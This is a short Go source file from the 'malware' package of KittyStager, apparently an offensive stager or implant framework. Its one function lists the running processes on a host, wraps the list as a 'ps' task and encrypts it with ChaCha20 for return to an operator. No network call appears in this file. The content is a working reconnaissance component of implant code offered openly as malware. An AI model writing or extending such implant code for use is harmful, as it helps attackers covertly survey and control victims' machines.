package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"KittyStager/internal/task/ps"
	"fmt"
	pl "github.com/mitchellh/go-ps"
)

func getProcessList(key string) ([]byte, error) {
	var processArray []ps.Process
	processList, err := pl.Processes()
	if err != nil {
		return nil, err
	}
	// map ages
	for x := range processList {
		var process pl.Process
		process = processList[x]
		p := ps.NewProcess(process.PPid(), process.Pid(), process.Executable())
		processArray = append(processArray, *p)
	}
	list := ps.NewProcessList(processArray)
	b, err := list.MarshallProcessList()
	if err != nil {
		return nil, err
	}
	t := task.NewTask("ps", b)
	tm, err := t.MarshallTask()
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	c := crypto.NewChaCha20()
	e, err := c.Encrypt(tm, []byte(key))
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	return e, nil
}
